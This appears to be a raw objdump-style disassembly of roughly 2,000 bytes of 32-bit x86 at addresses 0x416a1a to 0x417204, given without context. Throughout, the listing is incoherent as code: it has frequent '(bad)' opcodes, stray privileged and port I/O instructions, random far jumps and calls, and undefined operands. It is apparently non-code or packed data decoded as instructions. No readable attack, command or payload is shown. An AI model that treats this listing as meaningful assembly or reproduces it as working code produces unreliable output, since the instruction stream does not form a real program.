  416a1a:	inc    eax
  416a1b:	imul   ebp,ebp,0x13
  416a1e:	(bad)  
  416a1f:	rol    BYTE PTR cs:[ebx],cl
  416a22:	jnp    0x416a35
  416a24:	ins    DWORD PTR es:[edi],dx
  416a25:	mov    ebx,0x1c7b3251
  416a2a:	cvtps2pd xmm7,QWORD PTR [edx-0x2e]
  416a2e:	loop   0x4169f9
  416a30:	sub    DWORD PTR [eax-0x5a],eax
  416a33:	repz cmc 
  416a35:	ret    
  416a36:	sbb    al,0x43
  416a38:	out    0x91,eax
  416a3a:	iret   
  416a3b:	out    dx,eax
  416a3c:	shl    DWORD PTR [ecx-0x3e],0xcd
  416a40:	or     bl,BYTE PTR ds:0x5408671c
  416a46:	scas   eax,DWORD PTR es:[edi]
  416a47:	push   0x52
  416a49:	jmp    0x416a0a
  416a4b:	mov    WORD PTR [ecx+0x41],fs
  416a4e:	sbb    bl,cl
  416a50:	retf   
  416a51:	push   ecx
  416a52:	mov    DWORD PTR [edx+edi*4+0x6bf39557],ecx
  416a59:	fst    QWORD PTR [edx+esi*4]
  416a5c:	leave  
  416a5d:	pop    esp
  416a5e:	call   0xa0e3:0x6d28b915
  416a65:	stos   DWORD PTR es:[edi],eax
  416a66:	lds    ebp,FWORD PTR ss:[ebp+eiz*2+0xbacbed]
  416a6e:	add    BYTE PTR [eax],al
  416a70:	add    BYTE PTR [eax],al
  416a72:	call   0xfb7c3508
  416a77:	jnp    0x416a71
  416a79:	sar    DWORD PTR [edx-0x1b0c478b],cl
  416a7f:	(bad)  
  416a80:	or     eax,0xe84553
  416a85:	add    bl,dh
  416a87:	add    al,0x0
  416a89:	add    BYTE PTR ds:0x27c07c5e,ch
  416a8f:	inc    ecx
  416a90:	fnstenv [ecx+ebx*4-0x7]
  416a94:	mov    gs,edx
  416a96:	cmp    eax,ebp
  416a98:	and    edx,DWORD PTR [eax+eiz*2]
  416a9b:	out    dx,eax
  416a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a9d:	aam    0xf2
  416a9f:	xor    al,0x32
  416aa1:	pop    ecx
  416aa2:	and    al,BYTE PTR [edx+0x6d]
  416aa5:	std    
  416aa6:	adc    DWORD PTR [ecx+edx*4-0x717a5341],ebx
  416aad:	jo     0x416adc
  416aaf:	pusha  
  416ab0:	mov    edi,0x6ad5609a
  416ab5:	icebp  
  416ab6:	and    cl,bh
  416ab8:	js     0x416a78
  416aba:	pop    ss
  416abb:	jmp    0xc1f9:0x27cdb937
  416ac2:	ret    
  416ac3:	sub    DWORD PTR [ecx-0x64],ecx
  416ac6:	imul   ecx,esp,0x98227620
  416acc:	aam    0x4c
  416ace:	mov    ecx,0x5aaf36d3
  416ad3:	adc    al,0x28
  416ad5:	out    0xec,al
  416ad7:	ja     0x416ac7
  416ad9:	cwde   
  416ada:	add    BYTE PTR [edi+eax*4-0x55980bbe],dh
  416ae1:	rcr    ecx,1
  416ae3:	sub    al,0x6e
  416ae5:	add    bl,dh
  416ae7:	clc    
  416ae8:	shl    BYTE PTR [eax],cl
  416aea:	ror    ah,0xd9
  416aed:	pop    ebp
  416aee:	loope  0x416b38
  416af0:	jle    0x416b32
  416af2:	js     0x416ae8
  416af4:	xor    al,0x28
  416af6:	mov    ecx,0x6684c6a2
  416afb:	scas   eax,DWORD PTR es:[edi]
  416afc:	mov    edx,0xc410c4d0
  416b01:	rol    BYTE PTR [ebx],1
  416b03:	sub    eax,0xf30f4276
  416b08:	sub    DWORD PTR [ecx+0x5dc72d2e],eax
  416b0e:	(bad)  
  416b0f:	sub    BYTE PTR [ebp-0x3811af7b],bl
  416b15:	sub    al,0x44
  416b17:	and    ch,BYTE PTR [eax+0x16]
  416b1a:	and    edx,DWORD PTR [eax+0x2b251acc]
  416b20:	cwde   
  416b21:	mov    ch,ch
  416b23:	nop
  416b24:	fwait
  416b25:	inc    esi
  416b26:	jge    0x416acb
  416b28:	fist   WORD PTR ds:0x979eb747
  416b2e:	add    al,0x74
  416b30:	div    BYTE PTR [ebx-0x44]
  416b33:	and    al,0xe9
  416b35:	jo     0x416b1a
  416b37:	test   BYTE PTR [edi-0xce1a815],dl
  416b3d:	test   DWORD PTR ds:0x7d0e9d3f,0xeed2c39d
  416b47:	lods   eax,DWORD PTR ds:[esi]
  416b48:	cmc    
  416b49:	(bad)  
  416b4b:	mov    edi,DWORD PTR [eax+0x70]
  416b4e:	ss cwde 
  416b50:	ds aam 0xd2
  416b53:	sbb    DWORD PTR [esi+esi*2-0x29],ebp
  416b57:	cmp    BYTE PTR [ecx+edx*4+0x33],0xf9
  416b5c:	pop    ds
  416b5d:	aam    0x1e
  416b5f:	pop    es
  416b60:	lods   al,BYTE PTR ds:[esi]
  416b61:	jmp    0x416afa
  416b63:	pop    eax
  416b64:	push   es
  416b65:	(bad)  
  416b66:	push   0xc52467e2
  416b6b:	xor    edi,DWORD PTR [eax+eiz*1-0x7d3578ef]
  416b72:	daa    
  416b73:	cmp    ah,BYTE PTR [eax-0x7d]
  416b76:	xor    al,0xb1
  416b78:	fist   DWORD PTR [eax]
  416b7a:	(bad)  
  416b7b:	adc    bl,BYTE PTR [ebx-0x6fff1f06]
  416b81:	fdiv   st,st(1)
  416b83:	int3   
  416b84:	mov    esp,0xd6e2de43
  416b89:	das    
  416b8a:	iret   
  416b8b:	outs   dx,BYTE PTR ds:[esi]
  416b8c:	adc    esi,DWORD PTR [si+0x44]
  416b90:	pop    esi
  416b91:	out    dx,eax
  416b92:	push   es
  416b93:	push   edi
  416b94:	shl    BYTE PTR [eax],0xea
  416b97:	sub    bh,ah
  416b99:	add    al,dl
  416b9b:	rcl    DWORD PTR [edx+edi*2-0x700bb3b7],0x22
  416ba3:	je     0x416b43
  416ba5:	sbb    esp,DWORD PTR [edi-0x132ee0e6]
  416bab:	out    dx,al
  416bac:	out    dx,eax
  416bad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bae:	pop    ds
  416baf:	push   ds
  416bb0:	xor    BYTE PTR ds:0x7b4b02f0,cl
  416bb6:	xchg   ebx,eax
  416bb7:	test   DWORD PTR [ecx+ecx*4-0x7c870aa0],ebx
  416bbe:	cdq    
  416bbf:	adc    dh,cl
  416bc1:	ds std 
  416bc3:	pushf  
  416bc4:	xchg   edx,eax
  416bc5:	jo     0x416bdd
  416bc7:	mov    ebx,0x9ce964ba
  416bcc:	sub    al,0x7e
  416bce:	test   BYTE PTR [esi],dh
  416bd0:	hlt    
  416bd1:	adc    al,0x99
  416bd3:	bswap  esp
  416bd5:	push   es
  416bd6:	jge    0x416b78
  416bd8:	and    ebx,0x930ad7a6
  416bde:	xor    eax,0xe531edfe
  416be3:	fs push ds
  416be5:	jbe    0x416be5
  416be7:	inc    ax
  416be9:	shl    ah,1
  416beb:	push   ebp
  416bec:	and    edi,DWORD PTR [ebp-0x682494f4]
  416bf2:	xchg   ebp,eax
  416bf3:	pop    ecx
  416bf4:	in     al,dx
  416bf5:	and    edx,DWORD PTR [ebx]
  416bf7:	pop    ss
  416bf8:	jne    0x416bd4
  416bfa:	mov    ss,WORD PTR [esi-0x74b59995]
  416c00:	ror    BYTE PTR [ebx+0x7dbce1e7],cl
  416c06:	cdq    
  416c07:	mov    eax,0xdc834ed5
  416c0c:	fcmovnu st,st(6)
  416c0e:	shl    esi,0x2c
  416c11:	jne    0x416bbd
  416c13:	xor    ch,BYTE PTR [edi+0x19]
  416c16:	cwde   
  416c17:	jle    0x416bcb
  416c19:	push   edx
  416c1a:	fbld   TBYTE PTR [edi+0x61]
  416c1d:	daa    
  416c1e:	call   FWORD PTR [ebp-0x79]
  416c21:	mov    al,0x4a
  416c23:	into   
  416c24:	mov    fs,WORD PTR [ebp-0x5]
  416c27:	jle    0x416c5e
  416c29:	or     DWORD PTR [edx+0x3c],eax
  416c2c:	adc    DWORD PTR [ebx],ecx
  416c2e:	pusha  
  416c2f:	push   eax
  416c30:	xor    eax,0xdb50d767
  416c35:	cmp    edx,DWORD PTR [eax]
  416c37:	mov    al,ds:0x4dabb987
  416c3c:	scas   eax,DWORD PTR es:[edi]
  416c3d:	rol    BYTE PTR [ecx-0x3fcf68e6],0xae
  416c44:	shl    ecx,1
  416c46:	mov    ecx,0xa6dba3f6
  416c4b:	push   esi
  416c4c:	shl    cl,0x69
  416c4f:	pop    esi
  416c50:	pop    ss
  416c51:	fadd   DWORD PTR ds:0x3bafed49
  416c57:	call   0x1a0906c4
  416c5c:	add    edx,DWORD PTR [esi+edx*8+0x16]
  416c60:	push   es
  416c61:	jns    0x416c49
  416c63:	jnp    0x416c6e
  416c65:	or     ax,0x7274
  416c69:	bound  ebx,QWORD PTR ds:0x5d7f6199
  416c6f:	je     0x416c0d
  416c71:	push   ss
  416c72:	mov    ds:0x187bbe03,eax
  416c77:	jmp    0x51b01c4e
  416c7c:	cmp    ebx,DWORD PTR [edi+esi*2-0x58]
  416c80:	or     al,BYTE PTR [edx+0x1b2252f9]
  416c86:	in     al,0xec
  416c88:	shl    DWORD PTR [edi-0x54fa9d4a],cl
  416c8e:	daa    
  416c8f:	push   ecx
  416c90:	(bad)  
  416c91:	dec    ebp
  416c92:	push   ss
  416c93:	or     dl,BYTE PTR [ecx]
  416c95:	sbb    edi,eax
  416c97:	dec    ebp
  416c98:	dec    edx
  416c99:	xor    eax,0x8ad59ed3
  416c9e:	cmp    edx,DWORD PTR [esi-0x2]
  416ca1:	sahf   
  416ca2:	mov    ebp,0x99fe9165
  416ca7:	iret   
  416ca8:	std    
  416ca9:	fcomp  DWORD PTR [ecx+edx*4+0x8]
  416cad:	not    BYTE PTR [ecx]
  416caf:	or     al,0x57
  416cb1:	xchg   ebx,eax
  416cb2:	and    al,0x9d
  416cb4:	jns    0x416ca4
  416cb6:	cs enter 0x8ff5,0xa0
  416cbb:	cmp    al,0x3d
  416cbd:	lea    esp,[ecx+0x14]
  416cc0:	mov    ds:0x401e3fbb,al
  416cc5:	sub    al,0x6b
  416cc7:	xor    ecx,DWORD PTR [ebp+0x48]
  416cca:	scas   eax,DWORD PTR es:[edi]
  416ccb:	push   cs
  416ccc:	xor    ebp,DWORD PTR [esp+ebp*1]
  416ccf:	pop    ds
  416cd0:	jecxz  0x416ce3
  416cd2:	test   DWORD PTR [edi-0x445ec497],ecx
  416cd8:	inc    esi
  416cd9:	dec    esp
  416cda:	sub    ch,BYTE PTR [esi]
  416cdc:	sub    ah,ch
  416cde:	sub    al,dl
  416ce0:	xchg   esp,eax
  416ce1:	cmc    
  416ce2:	icebp  
  416ce3:	push   cs
  416ce4:	cmp    BYTE PTR ds:0xb9ead312,0xfa
  416ceb:	in     al,0xf
  416ced:	adc    BYTE PTR [ebp-0x21e2c57a],dl
  416cf3:	add    eax,0xa7b6f547
  416cf8:	wrmsr  
  416cfa:	push   ds
  416cfb:	in     eax,dx
  416cfc:	xor    al,BYTE PTR [edx]
  416cfe:	stc    
  416cff:	ds push ss
  416d01:	xchg   BYTE PTR [ebp-0x6],dh
  416d04:	sub    al,0x9d
  416d06:	jo     0x416d53
  416d08:	fwait
  416d09:	mov    dh,0x45
  416d0b:	shl    esp,0xdc
  416d0e:	in     al,dx
  416d0f:	in     eax,dx
  416d10:	int    0xa
  416d12:	retf   0xa0a6
  416d15:	into   
  416d16:	mov    BYTE PTR [edi],dh
  416d18:	cld    
  416d19:	call   DWORD PTR [edx-0x3a6e4299]
  416d1f:	outs   dx,BYTE PTR ds:[esi]
  416d20:	xchg   edx,eax
  416d21:	stos   DWORD PTR es:[edi],eax
  416d22:	ins    DWORD PTR es:[edi],dx
  416d23:	int3   
  416d24:	not    BYTE PTR [edi-0x3e]
  416d27:	jnp    0x416ce1
  416d29:	inc    ebx
  416d2a:	pop    ebx
  416d2b:	into   
  416d2c:	out    dx,eax
  416d2d:	and    dl,BYTE PTR ds:0x6053f649
  416d33:	or     ebp,DWORD PTR [edi]
  416d35:	sub    al,0x40
  416d37:	sti    
  416d38:	pop    ss
  416d39:	xchg   esp,eax
  416d3a:	adc    eax,0xf3fb10c8
  416d3f:	pop    ss
  416d40:	dec    ebp
  416d41:	sub    cl,dl
  416d43:	fsub   DWORD PTR [ecx+0x466c46fe]
  416d49:	jbe    0x416ce2
  416d4b:	or     DWORD PTR [eax*2-0x67f2482d],edx
  416d52:	dec    edx
  416d53:	cmp    BYTE PTR [ecx],dh
  416d55:	dec    esi
  416d56:	adc    bl,BYTE PTR [edi-0x21b8faa7]
  416d5c:	xor    DWORD PTR [eax+0x5603dfc5],0xfffffff2
  416d63:	in     al,0xe5
  416d65:	xchg   DWORD PTR [eax],edx
  416d67:	jne    0x416daa
  416d69:	test   DWORD PTR [ebp-0x4],esi
  416d6c:	(bad)  
  416d6d:	addr16 adc esp,edi
  416d70:	(bad)  
  416d71:	jge    0x416da6
  416d73:	out    0x65,eax
  416d75:	iret   
  416d76:	sbb    al,0x48
  416d78:	stos   BYTE PTR es:[edi],al
  416d79:	inc    ebx
  416d7a:	xchg   esp,eax
  416d7b:	jg     0x416dd4
  416d7d:	and    BYTE PTR [edx+0x333962af],bh
  416d83:	shl    DWORD PTR [eax-0x40551da6],cl
  416d89:	clc    
  416d8a:	loope  0x416dd5
  416d8c:	aas    
  416d8d:	sbb    al,0xe4
  416d8f:	icebp  
  416d90:	fwait
  416d91:	leave  
  416d92:	aam    0xce
  416d94:	jno    0x416d49
  416d96:	mov    ebx,0x834ec25d
  416d9b:	or     dh,ch
  416d9d:	mov    cl,0xdb
  416d9f:	pop    edx
  416da0:	inc    edx
  416da1:	mov    al,0xaf
  416da3:	pop    eax
  416da4:	cmc    
  416da5:	push   ebp
  416da6:	cmp    BYTE PTR [eax+0x43817072],dh
  416dac:	mov    al,0x79
  416dae:	xor    al,0x90
  416db0:	mov    eax,DWORD PTR [ebx+0x721872d9]
  416db6:	scas   eax,DWORD PTR es:[edi]
  416db7:	mov    eax,ds:0xe8f7d1ea
  416dbc:	mov    edi,esp
  416dbe:	pop    eax
  416dbf:	inc    esp
  416dc0:	daa    
  416dc1:	jmp    0xbb6c:0x35050f8e
  416dc8:	das    
  416dc9:	or     esp,DWORD PTR [edi+0x1667095b]
  416dcf:	(bad)  
  416dd0:	arpl   WORD PTR [esi-0x581ef5ca],bp
  416dd6:	int3   
  416dd7:	xchg   BYTE PTR [eax],cl
  416dd9:	mov    BYTE PTR [ecx+0x67],ah
  416ddc:	push   eax
  416ddd:	sub    edi,DWORD PTR gs:[ecx+eiz*1-0x66]
  416de2:	call   0x2f7c0885
  416de7:	adc    BYTE PTR [ecx-0x1a],bh
  416dea:	dec    edx
  416deb:	es pop ecx
  416ded:	in     eax,0x84
  416def:	jecxz  0x416dbe
  416df1:	jne    0x416e4a
  416df3:	pop    ebx
  416df4:	inc    esi
  416df5:	retf   0x905e
  416df8:	xor    eax,0xb79cc18b
  416dfd:	idiv   DWORD PTR [edx+0x73bc53d7]
  416e03:	push   edx
  416e04:	out    dx,al
  416e05:	call   0x26232115
  416e0a:	stos   DWORD PTR es:[edi],eax
  416e0b:	push   ecx
  416e0c:	and    cl,ch
  416e0e:	fcomp  QWORD PTR [edi-0x49]
  416e11:	dec    edx
  416e12:	rcl    DWORD PTR [edx+0x23146146],cl
  416e18:	(bad)  
  416e19:	(bad)  
  416e1b:	or     eax,0xf694047f
  416e20:	xor    BYTE PTR [edi-0x31817ce2],0x64
  416e27:	dec    ebx
  416e28:	or     DWORD PTR [esp+eax*8-0x24],edx
  416e2c:	fmul   st,st(5)
  416e2e:	(bad)  
  416e2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e30:	xchg   edx,eax
  416e31:	sbb    al,0x31
  416e33:	sub    WORD PTR [eax-0x2e],0xe947
  416e39:	dec    ebp
  416e3a:	xchg   DWORD PTR [edi+0xe],esp
  416e3d:	call   0x16b564e
  416e42:	mov    DWORD PTR [edi],0xa0a28c40
  416e48:	xor    BYTE PTR [ebx-0x68],ch
  416e4b:	aad    0x49
  416e4d:	(bad)
  416e51:	sub    esp,ebx
  416e53:	inc    ecx
  416e54:	loopne 0x416e91
  416e56:	xchg   ebp,eax
  416e57:	lds    ebp,FWORD PTR [esi-0xd]
  416e5a:	pop    ss
  416e5b:	ins    BYTE PTR es:[edi],dx
  416e5c:	push   esp
  416e5d:	gs ret 
  416e5f:	clc    
  416e60:	ins    BYTE PTR es:[edi],dx
  416e61:	ds fld QWORD PTR ds:[ebp+0x4515856c]
  416e69:	push   ss
  416e6a:	xchg   ebp,eax
  416e6b:	ror    DWORD PTR [esi-0x66556e37],1
  416e71:	jne    0x416e65
  416e73:	inc    edx
  416e74:	and    BYTE PTR [ecx+eiz*8+0x63268205],ch
  416e7b:	mov    esp,0xe482243c
  416e80:	jmp    0x2c5d:0x50e139f3
  416e87:	and    ch,al
  416e89:	ds or  eax,0x339d9d7f
  416e8f:	and    BYTE PTR [ebp+0x2a],ch
  416e92:	or     edx,esi
  416e94:	test   eax,0xec753901
  416e99:	leave  
  416e9a:	(bad)  
  416e9b:	push   esp
  416e9c:	push   esp
  416e9d:	xor    bl,0xb0
  416ea0:	ror    ecx,0x2a
  416ea3:	scas   eax,DWORD PTR es:[edi]
  416ea4:	xchg   ecx,eax
  416ea5:	retf   
  416ea6:	adc    DWORD PTR [ebp-0x28],0xf26f5315
  416ead:	test   cl,0x3f
  416eb0:	cmp    esi,0xffffffc8
  416eb3:	sar    DWORD PTR [eax-0x27],1
  416eb6:	inc    BYTE PTR [edx-0x68]
  416eb9:	stos   DWORD PTR es:[edi],eax
  416eba:	xchg   ebp,eax
  416ebb:	lock adc al,0x3e
  416ebe:	jp     0x416e64
  416ec0:	inc    esp
  416ec1:	(bad)  
  416ec2:	xor    ah,0xae
  416ec5:	scas   eax,DWORD PTR es:[edi]
  416ec6:	jp     0x416e83
  416ec8:	stc    
  416ec9:	repz cld 
  416ecb:	push   0x3f
  416ecd:	xor    eax,0xac0a38e7
  416ed2:	clc    
  416ed3:	and    eax,0x5a503fb2
  416ed8:	xchg   ecx,eax
  416ed9:	cmp    DWORD PTR [eax],ecx
  416edb:	jecxz  0x416f12
  416edd:	jmp    0xfd43aaac
  416ee2:	mov    al,ds:0x29c6597d
  416ee7:	add    DWORD PTR [ecx-0x62c4e408],esi
  416eed:	jne    0x416f1a
  416eef:	jnp    0x416f38
  416ef1:	jmp    0xe18f550d
  416ef6:	stos   BYTE PTR es:[edi],al
  416ef7:	es imul dl
  416efa:	mov    al,ds:0xde36dc
  416eff:	enter  0x3353,0xbb
  416f03:	mov    al,ds:0x820fc116
  416f08:	int    0x8f
  416f0a:	inc    edx
  416f0b:	pop    esp
  416f0c:	pop    ss
  416f0d:	stos   BYTE PTR es:[edi],al
  416f0e:	icebp  
  416f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f10:	jmp    0xc3e8ef65
  416f15:	sbb    eax,0x4c56da19
  416f1a:	aaa    
  416f1b:	pop    ebp
  416f1c:	mov    ds:0xb10f4e91,eax
  416f21:	dec    ebp
  416f22:	call   0x958e6d71
  416f27:	test   DWORD PTR [esi+0x75279d32],ecx
  416f2d:	idiv   DWORD PTR [edx+0x29baf269]
  416f33:	pop    ss
  416f34:	xchg   ebx,eax
  416f35:	inc    ebx
  416f36:	jo     0x416ecf
  416f38:	call   0x5bec:0x18a3e5c4
  416f3f:	adc    BYTE PTR [edx],cl
  416f41:	cs xchg edx,eax
  416f43:	jo     0x416f0b
  416f45:	aaa    
  416f46:	in     eax,dx
  416f47:	rol    DWORD PTR [ebx-0x3b],cl
  416f4a:	ds dec ecx
  416f4c:	rcl    DWORD PTR [ebx],1
  416f4e:	cmp    al,0x99
  416f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f51:	and    bh,BYTE PTR [edx]
  416f53:	lock push ds
  416f55:	mov    WORD PTR ds:0xdcd79de1,?
  416f5b:	sbb    BYTE PTR [esi],bl
  416f5d:	je     0x416f4c
  416f5f:	xor    BYTE PTR [edi+0x2ef73efc],bh
  416f65:	cwde   
  416f66:	or     BYTE PTR [ebx+ebp*8+0x5b],ah
  416f6a:	test   esi,esi
  416f6c:	popa   
  416f6d:	sub    ebx,ebx
  416f6f:	push   ecx
  416f70:	je     0x416f87
  416f72:	jge    0x416fcc
  416f74:	mov    ah,BYTE PTR [esi+0x67cb3de8]
  416f7a:	fstp   DWORD PTR [ebp-0x27]
  416f7d:	add    BYTE PTR [eax],al
  416f7f:	add    BYTE PTR [eax],al
  416f81:	add    BYTE PTR [ebp+0x2c],dl
  416f84:	pop    edi
  416f85:	test   DWORD PTR [edi-0x9],edi
  416f88:	(bad)  
  416f8a:	adc    dh,BYTE PTR [ecx-0x621309da]
  416f90:	cdq    
  416f91:	mov    al,0x38
  416f93:	in     eax,dx
  416f94:	add    BYTE PTR [eax],al
  416f96:	repz add al,0x0
  416f99:	add    BYTE PTR [edx-0x78d3fc44],cl
  416f9f:	and    ch,BYTE PTR [edi-0xb]
  416fa2:	(bad)  
  416fa3:	xchg   ebx,eax
  416fa4:	fwait
  416fa5:	les    esp,FWORD PTR [eax-0x4c3b59fe]
  416fab:	jo     0x416f38
  416fad:	pop    edx
  416fae:	in     al,0xcb
  416fb0:	sub    BYTE PTR [esi+0x7b],dl
  416fb3:	out    0xf8,eax
  416fb5:	js     0x416fea
  416fb7:	rcl    DWORD PTR [esp+edx*1+0x1f],1
  416fbb:	and    ah,bl
  416fbd:	push   ebx
  416fbe:	mov    gs,WORD PTR [ecx+ebx*8-0x1083d71]
  416fc5:	nop
  416fc6:	es mov al,0x18
  416fc9:	pop    ecx
  416fca:	out    0xb7,eax
  416fcc:	xlat   BYTE PTR ds:[ebx]
  416fcd:	xchg   DWORD PTR ds:0xbbf8f8a5,ebp
  416fd3:	sub    BYTE PTR [ebx+0x500d3078],cl
  416fd9:	ret    
  416fda:	out    0xb,eax
  416fdc:	sbb    cl,ah
  416fde:	sub    al,0x42
  416fe0:	stc    
  416fe1:	xor    al,0xaf
  416fe3:	jae    0x416f88
  416fe5:	adc    DWORD PTR [edx],edi
  416fe7:	out    dx,al
  416fe8:	mov    ah,0xbe
  416fea:	adc    al,0xcb
  416fec:	pop    edi
  416fed:	mov    dl,0xa1
  416fef:	fst    DWORD PTR [ebx+0x468585a1]
  416ff5:	xchg   ecx,eax
  416ff6:	iret   
  416ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff8:	sbb    esi,0x891db30a
  416ffe:	pop    edx
  416fff:	outs   dx,DWORD PTR ds:[esi]
  417000:	mov    eax,0x20a71af
  417005:	sub    DWORD PTR [edx-0x2afc3b6d],esi
  41700b:	or     DWORD PTR [edx],0x605572e2
  417011:	lods   eax,DWORD PTR ds:[esi]
  417012:	cs or  dh,0x5
  417016:	xchg   esp,eax
  417017:	idiv   DWORD PTR [eax-0x80]
  41701a:	jbe    0x417022
  41701c:	jmp    0x9d2f:0xd9cc3d3
  417023:	xchg   ebx,eax
  417024:	dec    edx
  417025:	imul   ebp,DWORD PTR [ecx],0xf56dbe9a
  41702b:	mov    eax,0x26fba314
  417030:	inc    esi
  417031:	dec    ebp
  417032:	push   0x7d19e95d
  417037:	cmp    esp,DWORD PTR [edi+0x12cf2931]
  41703d:	stos   DWORD PTR es:[edi],eax
  41703e:	jns    0x416fe2
  417040:	bound  ebp,QWORD PTR [ecx+0x44]
  417043:	sbb    al,0xf0
  417045:	xor    ch,BYTE PTR [esi-0x47dc562a]
  41704b:	xchg   ebx,eax
  41704c:	fbld   TBYTE PTR [ebx]
  41704e:	xor    edx,DWORD PTR [esi-0x3d5ca4e1]
  417054:	push   cs
  417055:	add    eax,0xa7575778
  41705a:	shr    DWORD PTR [ecx],1
  41705c:	push   ss
  41705d:	xchg   ecx,eax
  41705e:	jo     0x417082
  417060:	cs int3 
  417062:	jnp    0x417098
  417064:	mov    ebx,0xc10a4708
  417069:	(bad)  [ebx*1-0x1718dde4]
  417070:	cld    
  417071:	xor    esi,esp
  417073:	jnp    0x4170dc
  417075:	scas   al,BYTE PTR es:[edi]
  417076:	mov    bl,0x49
  417078:	add    eax,0xe03dd4bf
  41707d:	jle    0x417070
  41707f:	push   ds
  417080:	sub    esi,DWORD PTR [ecx+0x46]
  417083:	out    0x7c,eax
  417085:	push   DWORD PTR [eax+eax*1]
  417088:	push   ebp
  417089:	ss push ecx
  41708b:	mov    edi,?
  41708d:	out    0x18,al
  41708f:	fwait
  417090:	daa    
  417091:	mov    ah,0xaf
  417093:	or     BYTE PTR [eax+0x552541d3],bh
  417099:	inc    eax
  41709a:	xor    bl,0x3
  41709d:	sar    esp,0x72
  4170a0:	xchg   esi,eax
  4170a1:	les    ebp,FWORD PTR [ecx+edi*4-0x507a89a]
  4170a8:	lds    esi,FWORD PTR [eax+0x6c]
  4170ab:	mov    ebx,DWORD PTR [edi+ebp*1-0x7c584ddb]
  4170b2:	xchg   ebx,eax
  4170b3:	or     al,0x2e
  4170b5:	das    
  4170b6:	inc    ebx
  4170b7:	in     eax,0x73
  4170b9:	mov    DWORD PTR [edx-0x70],edx
  4170bc:	cmp    BYTE PTR [esi],0x73
  4170bf:	fimul  WORD PTR [esi]
  4170c1:	push   esp
  4170c2:	pop    es
  4170c3:	clc    
  4170c4:	(bad)  
  4170c5:	(bad)  
  4170c6:	and    ah,al
  4170c8:	iret   
  4170c9:	test   DWORD PTR [esi],0x3d363f96
  4170cf:	outs   dx,DWORD PTR ds:[esi]
  4170d0:	mov    ecx,0x2213e192
  4170d5:	fisubr DWORD PTR [esi-0x45374591]
  4170db:	jbe    0x4170cd
  4170dd:	push   cs
  4170de:	mov    ebp,0x4dcfd335
  4170e3:	xchg   ebx,eax
  4170e4:	xor    cl,bl
  4170e6:	and    eax,0xcc0b4822
  4170eb:	aaa    
  4170ec:	sbb    BYTE PTR [ecx-0x51e838c0],al
  4170f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f3:	psubb  mm1,QWORD PTR [edx]
  4170f6:	aaa    
  4170f7:	or     ebp,DWORD PTR [esi+0x45]
  4170fa:	stos   BYTE PTR es:[edi],al
  4170fb:	fisttp QWORD PTR [esi+0x5e]
  4170fe:	mov    ch,0x18
  417100:	jae    0x4170b5
  417102:	cmp    esp,DWORD PTR [ebx]
  417104:	push   edi
  417105:	mov    eax,0x7481d8b7
  41710a:	push   esi
  41710b:	cmp    eax,0xf409295e
  417110:	mov    al,ds:0xbd1f976d
  417115:	imul   eax,DWORD PTR [ebx+edx*4],0xffffff8b
  417119:	xchg   DWORD PTR [ebp-0x79],ebx
  41711c:	addr16 mov al,0xae
  41711f:	mov    ds:0xffb7fd82,eax
  417124:	aas    
  417125:	mov    edx,0x3c8387fa
  41712a:	push   esp
  41712b:	xchg   ebp,eax
  41712c:	(bad)  [edx+eiz*8]
  41712f:	add    dh,bh
  417131:	mov    ds:0x10abd1a3,al
  417136:	dec    edi
  417137:	jae    0x417155
  417139:	not    edi
  41713b:	push   0xc4f60835
  417140:	ret    0xb416
  417143:	mov    ds,esi
  417145:	fsub   st(2),st
  417147:	push   edi
  417148:	mov    ds:0x21717228,eax
  41714d:	int3   
  41714e:	dec    esi
  41714f:	cmp    edx,DWORD PTR [ecx-0x401746be]
  417155:	jae    0x4171cb
  417157:	jo     0x4170e1
  417159:	mul    DWORD PTR [esi+esi*4]
  41715c:	jno    0x41717b
  41715e:	xor    BYTE PTR [edi],ch
  417160:	sub    al,BYTE PTR [ebx]
  417162:	push   esi
  417163:	inc    eax
  417164:	mov    ds:0x306c7753,al
  417169:	mov    gs,WORD PTR [edx-0x2b4a5f2f]
  41716f:	sbb    DWORD PTR [ebx+0x19bd085b],esi
  417175:	sbb    al,0x53
  417177:	int3   
  417178:	cdq    
  417179:	pusha  
  41717a:	repz enter 0x5a6c,0x9
  41717f:	inc    edx
  417180:	(bad)  
  417181:	in     eax,0x23
  417183:	lahf   
  417184:	adc    ecx,DWORD PTR [edi]
  417186:	imul   ebp,DWORD PTR [ecx-0x39ca1b11],0xffffffbf
  41718d:	pusha  
  41718e:	mov    ebp,0xe035ebe2
  417193:	dec    ebx
  417194:	xchg   esp,eax
  417195:	and    ebx,DWORD PTR [eax-0x442b2867]
  41719b:	pop    ss
  41719c:	mov    dl,0x38
  41719e:	repz jle 0x41717e
  4171a1:	es out 0x6f,al
  4171a4:	xor    eax,0xa7b99999
  4171a9:	(bad)  
  4171ab:	pop    ds
  4171ac:	call   0x303afe91
  4171b1:	mov    eax,DWORD PTR [esi+0x48]
  4171b4:	xchg   cl,cl
  4171b6:	xor    BYTE PTR [ebx+ebx*1],0x5f
  4171ba:	ret    0xbfbc
  4171bd:	cdq    
  4171be:	mov    ds:0x67b5e0b6,al
  4171c3:	inc    ecx
  4171c4:	sbb    al,0xf9
  4171c6:	mov    dl,0xf5
  4171c8:	cmp    eax,0xff1fa55b
  4171cd:	aad    0xc4
  4171cf:	mov    dl,0xbb
  4171d1:	mov    gs,WORD PTR [esi-0x2c]
  4171d4:	neg    esp
  4171d6:	imul   esp,DWORD PTR [ecx+ecx*8-0x45],0xf8c6370
  4171de:	gs in  eax,0xba
  4171e1:	adc    al,0x53
  4171e3:	inc    eax
  4171e4:	sbb    eax,0xcac15697
  4171e9:	in     al,0x19
  4171eb:	hlt    
  4171ec:	fs xchg ecx,eax
  4171ee:	fdiv   DWORD PTR [edi]
  4171f0:	push   esi
  4171f1:	cmp    DWORD PTR [eax+0x5c],eax
  4171f4:	add    DWORD PTR [edi-0x56],edi
  4171f7:	inc    esp
  4171f8:	ret    0xd534
  4171fb:	sub    BYTE PTR [esi],0x18
  4171fe:	in     al,0xa9
  417200:	xchg   ecx,eax
  417201:	lahf   
  417202:	in     eax,0x39
  417204:	stc    
